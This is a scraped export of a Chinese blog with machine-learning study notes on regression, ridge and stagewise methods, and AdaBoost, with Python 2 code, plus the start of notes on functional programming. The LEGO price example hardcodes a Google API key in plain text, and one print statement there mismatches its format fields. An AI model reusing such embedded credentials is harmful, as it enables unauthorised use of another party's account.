plt.show() 上面代码绘制出结果如下，可以看出当k=0.003时纳入了太多的噪声点，k=1时的结果和使用最小二乘法的标准线性回归类似，k=0.01时的模型效果最好，平滑并且挖掘出数据内在规律。上图是k=0.01的情况，下图是k=0.003的情况。 局部加权线性回归也存在问题，即增加了计算量。因为其对每个点做预测时都要使用整个数据集，虽然k=0.01时得到了很好的估计，但大多数数据点的权重接近0，如果避免这些运算，可以减少程序运行时间，从而缓解因计算量增加带来的问题。 预测鲍鱼年龄 向regression.py中加入下面代码，用于计算两个参数间误差的大小。可以看出，使用较小的核会得到较低的误差，但使用较小的核会造成过拟合，对新数据不一定能达到最好的预测效果。在新数据中，核大小等于10时误差最小，但核为10时的训练误差却是最大的。通过比较，简单线性回归达到了与局部加权线性回归相似的效果，因此必须在未知数据集上比较效果才能选取到最佳模型。 12345678910111213141516171819202122232425def rssError(yArr, yHatArr): return ((yArr - yHatArr)**2).sum()&gt;&gt;&gt; abX, abY = regression.loadDataSet('abalone.txt')&gt;&gt;&gt; yHat01 = regression.lwlrTest(abX[0:99], abX[0:99], abY[0:99], 0.1)&gt;&gt;&gt; yHat1 = regression.lwlrTest(abX[0:99], abX[0:99], abY[0:99], 1.0)&gt;&gt;&gt; yHat10 = regression.lwlrTest(abX[0:99], abX[0:99], abY[0:99], 10.0)&gt;&gt;&gt; regression.rssError(abY[0:99], yHat01.T)56.782850757712595&gt;&gt;&gt; regression.rssError(abY[0:99], yHat1.T)429.89056187011101&gt;&gt;&gt; regression.rssError(abY[0:99], yHat10.T)549.11817088259465&gt;&gt;&gt; yHat01 = regression.lwlrTest(abX[100:199], abX[0:99], abY[0:99], 0.1)&gt;&gt;&gt; yHat1 = regression.lwlrTest(abX[100:199], abX[0:99], abY[0:99], 1.0)&gt;&gt;&gt; yHat10 = regression.lwlrTest(abX[100:199], abX[0:99], abY[0:99], 10.0)&gt;&gt;&gt; regression.rssError(abY[100:199], yHat01.T)14772.633501680577&gt;&gt;&gt; regression.rssError(abY[100:199], yHat1.T)573.5261441898798&gt;&gt;&gt; regression.rssError(abY[100:199], yHat10.T)517.57119053849158&gt;&gt;&gt; ws = regression.standRegres(abX[0:99], abY[0:99])&gt;&gt;&gt; yHat = mat(abX[100:199]) * ws&gt;&gt;&gt; regression.rssError(abY[100:199], yHat.T.A)518.63631532464785 缩减系数来“理解”数据 当数据特征数大于样本点，此时输入数据的矩阵X不是满秩矩阵，因此计算(X^T·X)^(-1)时会出错。为了解决该问题，引入“岭回归”（ridge regression）概念和lasso方法。 岭回归 简单说岭回归就是在矩阵X^T·X上增加一个λI从而使矩阵非奇异，进而能对X^T·X+λI求逆，其中矩阵I是一个m·m的单位矩阵。在这种情况下，回归系数的计算公式为(X^T·X+λI)^(-1)·X^T·y)。岭回归最先用来处理特征数多于样本数的情况，现在也用于在估计中加入偏差，从而得到更好的估计。这里通过引入λ来限制了所有w的和，通过引入该惩罚项，能够减少不重要的参数，称为“缩减”，缩减方法可以去掉不重要的参数，因此能更好的理解数据。 下面的代码包含计算回归系数的ridgeRegres函数和用于在一组λ上测试的ridgeTest函数。为了使用岭回归和缩减技术，首先要对数据标准化处理，使每维数据具有同样的重要性。具体的做法是所有特征都减去各自的均值并除以方差。代码中的λ以指数级变化，可以看出λ在去非常小的值和非常大的值时对结果造成的不同影响。 1234567891011121314151617181920212223242526272829303132def ridgeRegres(xMat, yMat, lam = 0.2): xTx = xMat.T * xMat denom = xTx + eye(shape(xMat)[1]) * lam if linalg.det(denom) == 0.0: print \"This matrix is singular, cannot do reverse\" return ws = denom.I * (xMat.T * yMat) return wsdef ridgeTest(xArr, yArr): xMat = mat(xArr); yMat = mat(yArr).T yMean = mean(yMat, 0) yMean1 = mean(yMat, 1) print yMean, yMean1 yMat = yMat - yMean xMeans = mean(xMat, 0) xVar = var(xMat, 0) xMat = (xMat - xMeans) / xVar numTestPts = 30 wMat = zeros((numTestPts, shape(xMat)[1])) for i in range(numTestPts): ws = ridgeRegres(xMat, yMat, exp(i-10)) wMat[i,:] = ws.T return wMat &gt;&gt;&gt; abX, abY = regression.loadDataSet('abalone.txt')&gt;&gt;&gt; ridgeWeights = regression.ridgeTest(abX, abY)&gt;&gt;&gt; import matplotlib.pyplot as plt&gt;&gt;&gt; fig = plt.figure()&gt;&gt;&gt; ax = fig.add_subplot(111)&gt;&gt;&gt; ax.plot(ridgeWeights)&gt;&gt;&gt; plt.show() 上面代码最后的cpython交互部分代码给出了岭回归的回归系数变化图，如下。在最左边即λ最小时，可以得到所有系数的原始值（和线性回归一致），在最右边，系数全部缩减为0。在中间的某个值可以取得最好的预测效果。 lasso 在增加约束∑w^2&lt;=λ的情况下，普通的最小二乘法会得到与岭回归同样的公式，这个限制条件限定了所有回归系数的平方和不能大于λ。使用普通的最小二乘法回归在当两个或更多的特征相关时，可能会得出一个很大的正系数和一个很大的负系数。正是因为上面限制条件的存在，岭回归可以避免这个问题。与岭回归类似，另一个缩减方法lasso也对回归系数做了限定，但约束为∑|w|&lt;=λ，这个约束条件用绝对值取代平方和。虽然形式变化不大，但结果差距明显。当λ足够小时，一些系数会因此被迫缩减到0，这个特性可以帮助我们更好地理解数据。在这个新的约束条件下求解回归系数极大的增加了计算复杂度，需要使用二次规划算法。 前向逐步回归 前向逐步回归算法可以得到与lasso差不多的效果，但更简单。它属于一种贪心算法，即每一步尽可能减少误差。一开始所有权重设为1，然后每一步的决策是对某个权重增加或减少一个很小的值。伪代码如下。 数据标准化，使其满足0均值和单位方差 在每轮迭代过程中：设置当前最小误差lowestError为正无穷。 在每轮迭代过程中：对每个特征：增大或减小：改变一个系数得到新的W，计算新W的误差，如果误差Error小于当前最小误差lowestError，设置Wbest等于当前的W。 返回Wbest 前向逐步线性回归函数 - regression.py。stageWise是逐步线性回归算法的实现，输入包括输入数据xArr和预测变量yArr，每次迭代要调整的步长eps和迭代次数numIt。函数首先将输入数据转换并存入矩阵，然后把特征按照均值为0方差为1进行标准化处理。之后迭代numIt次，更新最佳W矩阵。从运行得出的数据看出，w1和w6都是0，队结果没有任何影响，因此这两个特征很可能是不需要的。另外，在eps=0.01的情况下，一段时间后系数就已经在特定值之间来回震荡，这是因为步长太大，如第一个特征在0.04和0.05之间震荡。 1234567891011121314151617181920212223242526272829303132def stageWise(xArr, yArr, eps=0.01, numIt = 100): xMat = mat(xArr); yMat = mat(yArr).T yMean = mean(yMat, 0) yMat = yMat - yMean xMat = regularize(xMat) m, n = shape(xMat) returnMat = zeros((numIt, n)) ws = zeros((n,1)); wsTest = ws.copy(); wsMax = ws.copy() for i in range(numIt): print ws.T lowestError = inf for j in range(n): for sign in [-1, 1]: wsTest = ws.copy() wsTest[j] += eps*sign yTest = xMat * wsTest rssE = rssError(yMat.A, yTest.A) if rssE &lt; lowestError: lowestError = rssE wsMax = wsTest ws = wsMax.copy() returnMat[i,:] = ws.T return returnMat&gt;&gt;&gt; regression.stageWise(xArr, yArr, 0.01, 200)array([[ 0. , 0. , 0. , ..., 0. , 0. , 0. ], [ 0. , 0. , 0. , ..., 0. , 0. , 0. ], [ 0. , 0. , 0. , ..., 0. , 0. , 0. ], ..., [ 0.05, 0. , 0.09, ..., -0.64, 0. , 0.36], [ 0.04, 0. , 0.09, ..., -0.64, 0. , 0.36], [ 0.05, 0. , 0.09, ..., -0.64, 0. , 0.36]]) 换用更小的步长，并和常规最小二乘法比较。 12345678910111213141516&gt;&gt;&gt; regression.stageWise(xArr, yArr, 0.001, 5000)array([[ 0. , 0. , 0. , ..., 0. , 0. , 0. ], [ 0. , 0. , 0. , ..., 0. , 0. , 0. ], [ 0. , 0. , 0. , ..., 0. , 0. , 0. ], ..., [ 0.043, -0.011, 0.12 , ..., -0.963, -0.105, 0.187], [ 0.044, -0.011, 0.12 , ..., -0.963, -0.105, 0.187], [ 0.043, -0.011, 0.12 , ..., -0.963, -0.105, 0.187]])&gt;&gt;&gt; xMat = mat(xArr); yMat = mat(yArr).T&gt;&gt;&gt; xMat = regression.regularize(xMat)&gt;&gt;&gt; yM = mean(yMat, 0)&gt;&gt;&gt; yMat = yMat - yM&gt;&gt;&gt; weights = regression.standRegres(xMat, yMat.T)&gt;&gt;&gt; weights.Tmatrix([[ 0.0430442 , -0.02274163, 0.13214087, 0.02075182, 2.22403814, -0.99895312, -0.11725427, 0.16622915]]) 从数据可以看出，5000次迭代后，逐步线性回归算法和组常规的最小二乘法效果类似，使用0.001的ε值并经过5000次迭代的效果如下图。逐步线性回归算法的好处在于它可以帮助人们理解现有的模型并做出改进。当构建了一个模型后，可以运行该算法找出重要的特征，这样有可能及时停止那些不重要特征的收集。如果用于测试，该算法每100次迭代后就可以构建出一个模型，可以使用类似10折交叉验证的方法比较这些模型，选择误差最小的模型。当应用缩减方法（如逐步线性回归或岭回归）时，模型也就增加了偏差，与此同时减小了模型的方差。 权衡偏差与方差 当发现模型和测量值之间存在差异，说明出现了误差。当对复杂的过程进行简化时，会导致模型和测量值之间出现“噪声”或者误差，若无法理解数据的真是生成过程，也会导致差异发生。另外，测量过程本身也可能产生“噪声”。 如果降低核的大小，训练误差将变小，而测试误差则不一定。以模型复杂度为横轴，预测误差为纵轴，则训练误差的图象类似y = e^(-x)，而测试误差的图像类似y=(x-1)^2。使用缩减法将一些系数缩减成很小的值或直接缩减为0，这就减少了模型的复杂度。例子里有8个特征，消除其中两个既使模型易于理解，又降低了预测误差。 方差可以度量，取任意两个随机样本集，得出的回归系数都是不同的，这些回归系数间的差异大小就是模型方差大小的反应。偏差（预测值和真实值）和方差（不同回归系数间差异）折中的概念在机器学习十分流行且反复出现。 预测乐高玩具套装价格 用回归法预测乐高套装价格流程 收集数据：使用Google Shopping的API。 准备数据：从返回的json数据中抽取价格。 分析数据：可视化并观察数据。 训练算法：构建不同的模型，采用逐步线性回归和直接的线性回归模型。 测试算法：使用交叉验证来测试不同的模型。 获取购物信息的函数searchForSet和setDataCollect，regression.py。searchForSet函数调用google购物api并保证数据抽取的正确性。初始休眠10秒防止短时间内过多的api调用。对得到的数据用简单的方法判断是否为二手套装（价格低于原始价格一半），并过滤掉这些信息。似乎现在这个URL已经404错误了，当然是挂了VPN的情况下。 12345678910111213141516171819202122232425262728293031def searchForSet(retX, retY, setNum, yr, numPce, origPrc): sleep(10) myAPIstr = 'AIzaSyD2cR2KFyx12hXu6PFU-wrWot3NXvko8vY' searchURL = 'https://www.googleapis.com/shopping/search/v1/public/products?key=%s&amp;country=US&amp;q=lego+%d&amp;alt=json' % (myAPIstr, setNum) pg = urllib2.urlopen(searchURL) retDict = json.loads(pg.read()) for i in range(len(retDict['items'])): try: currItem = retDict['items'][i] if currItem['product']['condition'] == 'new': newFlag = 1 else: newFlag = 0 listOfInv = currItem['product']['inventories'] for item in listOfInv: sellingPrice = item['price'] if sellingPrice &gt; origPrc * 0.5: print \"%d\\t%d\\t%d\\t%f\\t%f\" % \\ (yr, numPce, newFlag, origPrc, newFlag, origPrc) retX.append([yr, numPce, newFlag, origPrc]) retY.append(sellingPrice) except: print 'problem with item %d' % idef setDataCollect(retX, retY): searchForSet(retX, retY, 8288, 2006, 800, 49.99) searchForSet(retX, retY, 10030, 2002, 3096, 269.99) searchForSet(retX, retY, 10179, 2007, 5195, 499.99) searchForSet(retX, retY, 10181, 2007, 3428, 199.99) searchForSet(retX, retY, 10189, 2008, 5922, 299.99) searchForSet(retX, retY, 10196, 2009, 3263, 249.99) 根据书上的结果，用常规最小二乘法得到的回归公式是55319.97-27.59*Year-0.00268*NumPieces-11.22*NewOrUsed+2.57*OriginalPrice，即售价和套装里的零部件数目和崭新程度成反比，显然不合常理。下面交叉验证测试岭回归。随机生成10组交叉验证的数据集，并在每组数据上调用岭回归产生的30组回归系数，最后选取使10组数据集误差均值最小的回归系数。最终的结果和常规最小二乘法没有太大差异，显然我们要寻找一个更易于理解的模型的期望没有达到。但我们可以查看岭回归过程中，回归系数在迭代中缩减的情况，因为系数是经过不同程度的缩减得到的，因此在特征非常多时，它可以指出哪些特征是必须的而哪些是不必要的。 12345678910111213141516171819202122232425262728293031def crossValidation(xArr, yArr, numVal = 10): m = len(yArr) indexList = range(m) errorMat = zeros((numVal, 30)) for i in range(numVal): trainX = []; trainY = [] testX = []; testY = [] random.shuffle(indexList) for j in range(m): if j &lt; m * 0.9: trainX.append(xArr[indexList[j]]) trainY.append(yArr[indexList[j]]) else: testX.append(xArr[indexList[j]]) testY.append(yArr[indexList[j]]) wMat = ridgeTest(trainX, trainY) for k in range(30): matTestX = mat(testX); matTrainX = mat(trainX) meanTrain = mean(matTrainX, 0) varTrain = var(matTrainX, 0) matTestX = (matTestX - meanTrain) / varTrain yEst = matTestX * mat(wMat[k,:]).T + mean(trainY) errorMat[i,k] = rssError(yEst.T.A, array(testY)) meanErrors = mean(errorMat, 0) minMean = float(min(meanErrors)) bestWeights = wMat[nonzero(meanErrors==minMean)] xMat = mat(xArr); yMat = mat(yArr) meanX = mean(xMat, 0); varX = var(xMat, 0) unReg = bestWeights/varX print \"the best model from Ridge Regression is: \\n\" , unReg print \"with constant term: \", -1*sum(multiply(meanX, unReg)) + mean(yMat) 回归预测数值型数据 总结 回归也是预测目标值的过程，但预测的目标是连续性变量。在回归方程中，求得特征对应的最佳回归系数的方法是最小化误差平方和。给定输入矩阵X，如果X^T·X的逆存在，则可使用标准回归法。标准回归法可能会出现欠拟合现象，如果在估计中引入一些偏差，就可以降低预测的均方误差，其中一个方法是局部加权线性回归。如果数据的样本数比特征数都要小，特征很可能高度相关，此时X^T·X必然不是满秩矩阵，无法求逆。此时可以考虑使用岭回归，岭回归是缩减法的一种，相当于为回归系数的大小增加了限制。另一种缩减法是lasso，可以用计算简便的逐步线性回归方法求得近似结果。缩减法可以看成是对一个模型增加偏差的同时减小方差，偏差方差折中可以帮助我们理解现有模型并做出改进。 参考文献： 《机器学习实战 - 美Peter Harrington》 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2016/02/18/machinelearning8/) 、作者信息（Forec）和本声明。","categories":[{"name":"大数据/分布式系统","slug":"大数据-分布式系统","permalink":"http://forec.github.io/categories/大数据-分布式系统/"}],"tags":[{"name":"Algorithms","slug":"Algorithms","permalink":"http://forec.github.io/tags/Algorithms/"},{"name":"机器学习","slug":"机器学习","permalink":"http://forec.github.io/tags/机器学习/"}],"keywords":[{"name":"大数据/分布式系统","slug":"大数据-分布式系统","permalink":"http://forec.github.io/categories/大数据-分布式系统/"}]},{"title":"机器学习笔记（Chapter 07 - AdaBoost元算法）","slug":"machinelearning7","date":"2016-02-14T14:06:25.000Z","updated":"2017-08-22T07:30:32.000Z","comments":true,"path":"2016/02/14/machinelearning7/","link":"","permalink":"http://forec.github.io/2016/02/14/machinelearning7/","excerpt":"元算法是对其他算法进行组合的一种方式。在做决定时，大家通常考虑吸取多个专家（分类算法）而不是一个专家的意见。当我们试图对样例数目不均衡的数据进行分类时，会遇到非均衡分类问题。","text":"元算法是对其他算法进行组合的一种方式。在做决定时，大家通常考虑吸取多个专家（分类算法）而不是一个专家的意见。当我们试图对样例数目不均衡的数据进行分类时，会遇到非均衡分类问题。 基于数据集多重抽样的分类器 前面已经介绍了五种不同的分类算法，各有优缺点。我们可以将不同的分类器组合起来，这种组合结果被称为集成方法或者元算法。使用集成方法时会有许多形式，可以是不同算法的集合，也可以是同一算法在不同设置下的集成，还可以是数据集不同部分分配给不同分类器之后的集成。 自举汇聚法 （bootstrap aggregating，bagging）是从原始数据集选择S次后得到S个新数据集的技术。新数据集和原数据集大小相等，每个数据集都是通过在原始数据集中随机选择一个样本来进行替换得到的，因此有可能出现多次选择同一样本，所以这一行只允许新数据集中有重复的值，而原始数据集的某些值在新集合中则不再出现。当这S个数据集建好，将某个学习算法应用到每个数据集就得到了S个分类器，之后用这S个分类器分类，投票选择最终类别。其它先进的bagging方法有随机森林等，讨论材料见http://www.stat.berkeley.edu/~breiman/RandomForests/cc_home.htm。 boosting是一种与bagging类似的技术，无论在bo哦sting还是bagging中，分类器的类型都是一致的。但在前者中，不同的分类器是通过串行训练获得的，每个新分类器都根据已训练出的分类器的性能来训练。 boosting是通过集中关注被已有分类器错分的数据来获得新的分类器 。bagging中各个分类器的权重相等，而boosting中的分类器权重不等，代表其对应分类器在上一轮迭代中的成功度。 AdaBoost流程 准备数据：依赖于使用的弱分类器类型，本章使用单层决策树，也可以使用任意分类器充当弱分类器。简单分类器作为弱分类器效果更好。 分析数据：任意方法。 训练算法：占据大部分时间，分类器将多次在同一数据集上训练弱分类器。 测试算法：计算分类错误率。 使用算法：二类分类器。 基于错误提升分类器性能 可以通过弱分类器和多个实例来构造一个强分类器，这里的“弱”意味着分类器的性能比随即猜测要略好，但不会好太多。AdaBoost是adaptive boosting（自适应boosting），过程如下。 训练数据集中的每个样本，并赋予其一个权重，这些权重构成了向量D。一开始这些权重都初始化为相等值。首先在训练数据上训练出一个弱分类器并计算该分类器的错误率，然后在同一数据集上再一次训练弱分类器。在分类器的第二次训练中，会重新调整每个样本的权重，其中上一次训练中分对的样本所占权重会降低，分错的样本所占样本权重升高。 AdaBoost为每个弱分类器设置一个权重α，这些α值根据每个弱分类器的错误率计算，错误率ε=未正确分类的样本数/所有的样本数目。α计算公式为α=0.5*ln((1-ε)/ε)。可见错误率下降，α上升。计算出α后，对权重向量D更新，如果某个样本被正确地分类，那么D&#39; = D*e^(-α)/sum(D)，如果某个样本被错分，那么D&#39; = D*e^α/sum(D)。 更新D后，AdaBoost进入下一轮迭代。其会不断重复训练和调整权重的过程，直到某次训练错误率为0，或者弱分类器达到用户指定的数量。 基于单层决策树构建弱分类器 单层决策树（决策树桩）是一种简单的决策树，仅基于单个特征来做决策，只有一次分裂过程，因此是一个树桩。 简单数据集加载 - adaboost.py 12345678def loadSimpData(): datMat = matrix([[ 1. , 2.1 ], [ 2. , 1.1 ], [ 1.3, 1. ], [ 1. , 1. ], [ 2. , 1. ]]) classLabels = [1.0, 1.0, -1.0, -1.0, 1.0] return datMat, classLabels 建立最佳单层决策树 将最小错误率minError设为+∞ 对数据集中的每一个特征（一层循环）： &nbsp;&nbsp;&nbsp;&nbsp;对每个步长（二层循环）： &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对每个不等号（三层循环）： &nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;建立一棵单层决策树并利用加权数据集对他测试，如果错误率低于minError，就将当前的单层决策树设为最佳单层决策树 返回最佳单层决策树 最佳单层决策树生成函数 - adaboost.py。下面包含两个函数，stumpClassify是通过阈值threshVal来确定类别，在阈值一边的数据分到类别-1，另一边分到类别+1。第二个函数buildStump遍历stumpClassify所有可能输入值，第一层循环遍历数据集所有特征，第二层遍历所有阈值，第三层遍历不等号。并找到数据集上最佳的单层决策树。之后返回一个bestStump字典，存乎了最优单层决策树的信息。 1234567891011121314151617181920212223242526272829303132def stumpClassify(dataMatrix, dimen, threshVal, threshIneq): retArray = ones((shape(dataMatrix)[0], 1)) if threshIneq == 'lt': retArray[dataMatrix[:,dimen] &lt;= threshVal] = -1.0 else: retArray[dataMatrix[:,dimen] &gt; threshVal] = -1.0 return retArraydef buildStump(dataArr, classLabels, D): dataMatrix = mat(dataArr); labelMat = mat(classLabels).T m, n = shape(dataMatrix) numSteps = 10.0; bestStump = &#123;&#125;; bestClasEst = mat(zeros((m,1))) minError = inf for i in range(n): rangeMin = dataMatrix[:,i].min(); rangeMax = dataMatrix[:,i].max(); stepSize = (rangeMax - rangeMin)/numSteps for j in range(-1,int(numSteps)+1): for inequal in ['lt','gt']: threshVal = (rangeMin + float(j) * stepSize) predictedVals = stumpClassify(dataMatrix, i, threshVal, inequal) errArr = mat(ones((m,1))) errArr[predictedVals == labelMat] = 0 weightedError = D.T * errArr #print \"split: dim %d, thresh %.2f, thresh inequal: %s, the weighted error is %.3f\" %\\ # (i, threshVal, inequal, weightedError) if weightedError &lt; minError: minError = weightedError bestClasEst = predictedVals.copy() bestStump['dim'] = i bestStump['thresh'] = threshVal bestStump['ineq'] = inequal return bestStump, minError, bestClasEst 完整AdaBoost算法 伪代码：对每次迭代 利用buildStump找到最佳的单层决策树 将最佳单层决策树加入单层决策树数组 计算α 计算新的权重向量D 更新累计类别估计值 如果错误率为0.0则退出循环。 下面是训练过程代码，输入参数为数据集、类别标签和迭代次数。D是概率分布向量，因此所有元素之和为1，因此初始全部为1/m。同时程序建立列向量aggClassEst记录每个数据点的类别估计累计值。程序中max(error, 1e-16)防止出现除零溢出。 12345678910111213141516171819202122def adaBoostTrainDS(dataArr, classLabels, numIt = 40): weakClassArr = [] m = shape(dataArr)[0] D = mat(ones((m,1))/m) aggClassEst = mat(zeros((m,1))) for i in range(numIt): bestStump, error, classEst = buildStump(dataArr, classLabels, D) print \"D:\", D.T alpha = float(0.5*log((1.0-error)/max(error,1e-16))) bestStump['alpha'] = alpha weakClassArr.append(bestStump) print \"classEst \", classEst.T expon = multiply(-1*alpha*mat(classLabels).T, classEst) D = multiply(D, exp(expon)) D = D/D.sum() aggClassEst += alpha*classEst print \"aggClassEst: \", aggClassEst.T aggErrors = multiply(sign(aggClassEst) != mat(classLabels).T, ones((m,1))) errorRate = aggErrors.sum() / m print \"total error: \", errorRate, \"\\n\" if errorRate == 0.0 : break return weakClassArr, aggClassEst 分类：输入参数是待分类数据和分类器。遍历强分类器中的每个弱分类器，并通过stumpClassify得到每个分类器对某个类别的估计值。 12345678910def adaClassify(datToClass, classifierArr): dataMatrix = mat(datToClass) m = shape(dataMatrix)[0] aggClassEst = mat(zeros((m,1))) for i in range(len(classifierArr)): classEst = stumpClassify(dataMatrix, classifierArr[i]['dim'],\\ classifierArr[i]['thresh'], classifierArr[i]['ineq']) aggClassEst += classifierArr[i]['alpha'] * classEst print aggClassEst return sign(aggClassEst) 在疝气病马数据集上应用AdaBoost算法，通过loadDataSet读入数据，并进行分类。 12345678910111213141516171819def loadDataSet(filename): numFeat = len(open(filename).readline().split('\\t')) dataMat = []; labelMat = [] fr = open(filename) for line in fr.readlines(): lineArr = [] curLine = line.strip().split('\\t') for i in range(numFeat - 1): lineArr.append(float(curLine[i])) dataMat.append(lineArr) labelMat.append(float(curLine[-1])) return dataMat, labelMat&gt;&gt;&gt; datArr, labelArr = adaboost.loadDataSet('horseColicTraining2.txt')&gt;&gt;&gt; classifierArray = adaboost.adaBoostTrainDS(datArr, labelArr, 10)&gt;&gt;&gt; testArr, testLabelArr = adaboost.loadDataSet('horseColicTest2.txt')&gt;&gt;&gt; prediction10 = adaboost.adaClassify(testArr, classifierArray)&gt;&gt;&gt; errArr = mat(ones((67,1)))&gt;&gt;&gt; errArr[prediction10!=mat(testLabelArr).T].sum() 错误率分析：当分类器数目从1到10000变化时，总测试错误率先达到一个 最小值，之后又上升。该现象称为过拟合。有文献表明，对于表现好的数据集（horseColicTest有30%数据缺失），AdaBoost的测试错误率会达到一个稳定之，并不会随着分类器增加而上升。 非均衡类问题和其他分类性能度量指标 之前的分类都假设所有分类代价一样，但实际上将马归类为死或者活的代价不同，假如分类器只有80%正确率，将一匹本能存活的马判定为安乐死，损失会更大。 混淆矩阵：列方向为预测结果，行方向为实际结果，如果除了对角线，其他元素都是0，那么将是一个完美的分类器。 对于二类问题：如果将正例判为正例则产生真阳例（TP），将反例正确判为反例则产生真阴例（TN），将正例错判为反例，则产生假阴例（FN），将反例错判为正例称为假阳例（FP）。正确率=TP/(TP+FP)，召回率=TP/(TP+FN)。在高召回率的分类器重，真正判错的正例数目并不多。我们可以很容易构造一个高准确率或者高召回率的分类器，但很难保证两者同时成立。 ROC曲线：横轴为假阳率=FP/(FP+TN)，纵轴是真阳率=TP/(TP+FN)。ROC曲线给出的是当阈值变化时假阳率和真阳率变化的情况。左下角点对应所有样例判为反例，右上角对应所有样例判为正例。理想情况下，最佳分类器应尽可能处于左上角。另一个指标是ROC曲线下的面积AUC，代表了分类器的平均性能值。完美分类器的AUC=1.0，随即猜测的AUC=0.5。 创建ROC曲线。首先将分类样例按照预测强度排序，强度高的分为正例，低的判为反例。下面为创建ROC曲线的代码。 12345678910111213141516171819202122232425def plotROC(predStrengths, classLabels): import matplotlib.pyplot as plt cur = (1.0, 1.0) ySum = 0.0 numPosClas = sum(array(classLabels) == 1.0) yStep = 1/float(numPosClas) xStep = 1/float(len(classLabels) - numPosClas) sortedIndicies = predStrengths.argsort() fig = plt.figure() fig.clf() ax = plt.subplot(111) for index in sortedIndicies.tolist()[0]: if classLabels[index] == 1.0: delX = 0; delY = yStep; else: delX = xStep; delY = 0; ySum += cur[1] ax.plot([cur[0], cur[0]-delX], [cur[1], cur[1] - delY], c= 'b') cur = (cur[0] - delX, cur[1] - delY) ax.plot([0,1],[0,1],'b--') plt.xlabel('False Positive Rate'); plt.ylabel('True Positive Rate') plt.title('ROC curve for AdaBoost Horse Colic Detection System') ax.axis([0,1,0,1]) plt.show() print \"the Area Under the Curve is: \", ySum * xStep 生成图像如下 代价敏感的学习：选择具有最小期望代价而不是最大概率的类别作为最后的结果。 数据抽样方法：欠抽样和过抽样。欠抽样指删除部分样例，过抽样指复制部分样例。对于罕见类别，要尽量保留更多信息，通常选择离决策边界较远的样例删除。另一种策略是使用反例类别的欠抽样和正例类别的过抽样结合。 AdaBoost元算法总结 元算法过多个分类器组合，可以减轻单分类器的不足。AdaBoost函数可以应用于任何分类器，只要该分类器可以处理加权数据。非均衡分类问题指在分类器训练时正例数目和反例数目不等或者相差很大，或者错分正例和反例代价不同时产生。 参考文献： 《机器学习实战 - 美Peter Harrington》 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2016/02/14/machinelearning7/) 、作者信息（Forec）和本声明。","categories":[{"name":"大数据/分布式系统","slug":"大数据-分布式系统","permalink":"http://forec.github.io/categories/大数据-分布式系统/"}],"tags":[{"name":"Algorithms","slug":"Algorithms","permalink":"http://forec.github.io/tags/Algorithms/"},{"name":"机器学习","slug":"机器学习","permalink":"http://forec.github.io/tags/机器学习/"}],"keywords":[{"name":"大数据/分布式系统","slug":"大数据-分布式系统","permalink":"http://forec.github.io/categories/大数据-分布式系统/"}]},{"title":"《函数式编程思维》笔记","slug":"functional-thinking","date":"2016-02-13T01:36:15.000Z","updated":"2016-11-17T06:11:16.000Z","comments":true,"path":"2016/02/13/functional-thinking/","link":"","permalink":"http://forec.github.io/2016/02/13/functional-thinking/","excerpt":"函数式编程中粒度最小的重用单元是函数（一等公民），并具备值不可变性，带给我的感受是通过一系列基本数据结构方法的复用，配合高阶函数，用最基本的方法叠加出复杂的解法。在用Haskell解决问题总能体会到逆向思维，从目标出发，一步步推到初始条件。函数式的模式匹配、柯里化和部分施用都很有特色，在这种思维下思考是一个很享受的过程。下面是阅读《函数式编程思维》时做摘录的整理。","text":"函数式编程中粒度最小的重用单元是函数（一等公民），并具备值不可变性，带给我的感受是通过一系列基本数据结构方法的复用，配合高阶函数，用最基本的方法叠加出复杂的解法。在用Haskell解决问题总能体会到逆向思维，从目标出发，一步步推到初始条件。函数式的模式匹配、柯里化和部分施用都很有特色，在这种思维下思考是一个很享受的过程。下面是阅读《函数式编程思维》时做摘录的整理。 思维转变 命令式编程风格通常 迫使我们出于性能考虑，把不同的任务交织起来，以便能够用一次循环来完成多个任务 。而函数式编程用map、filter这些高阶函数把我们解放出来，让我们 站在更高的抽象层次上去考虑问题 ，把问题看得更清楚。 把控制权让渡给语言（运行时）。“人生苦短，远离malloc”。函数式编程语言让我们用高阶抽象从容取代基本的控制结构，将琐碎的细节（如垃圾处理）交托给运行时。 面向对象编程通过封装不确定因素来使代码能被人理解；函数式编程通过尽量减少不确定因素来使代码能被人理解。——Michael Feathers 。与其建立种种机制来控制可变的状态，不如尽可能消灭可变的状态这个不确定因素。 函数式语言提倡 在有限的几种关键数据结构（list、set、map）上运用针对这些数据结构高度优化过的操作 ，以此形成基本的运转架构；面向对象程序员喜欢不断的创建新的数据结构和附属的操作，因为OOP范式就是建立新的类和类间的消息。比起一味创建新的类结构体系，把封装的单元降低到函数级别，更有利于达到细颗粒度的、基础层面的重用。 换用函数式语言不是关键，转变看待问题的角度才是必不可少的。命令式编程是按照“程序是一系列改变状态的命令”来建模的一种编程风格，鼓励程序员将操作安排在循环内部执行。 函数式语言希望尽可能减少可变的状态 ，因此更多发展了通用性的计算设施。 高阶函数消除了摩擦。语法上的便利是非常重要的方面， 在语法处处掣肘下塑造出的抽象，很难配合我们的思维过程而不产生所谓的摩擦 。迭代需要让位于高阶函数，如果能用高阶函数把希望执行的操作表达出来，语言将会把操作安排的更高效。 权责让渡 理解掌握的抽象层次永远要比日常使用的抽象层次更深一层 。 闭包 （closure）实际上是一种特殊的函数，在暗地里绑定了函数内部引用的所有变量，换句话说，这种函数把它所引用的所有东西都放在一个上下文里包了起来。下面的代码先定义了一个Employee类，其中带有name和salary字段，接着定义带有amount参数的paidMore函数，其返回值是一个以Employee实例为参数的 代码块 ，或者叫闭包。数值100000随着isHighPaid = paidMore(100000)这一步操作永久的和代码块绑定在一起。第二部分代码执行闭包。 12345678910111213class Employee&#123; def name, salary&#125;def paidMore(amount) &#123; return &#123;Employee e -&gt; e.salary &gt; amount &#125;&#125;isHighPaid = paidMore(100000) def Smithers = new Employee(name:\"Fred\", salary:120000)def Homer = new Employee(name:\"Homer\", salary:80000)println isHighPaid(Smithers)println isHighPaid(Homer) 闭包经常被函数式语言和框架当作一种 异地执行的机制 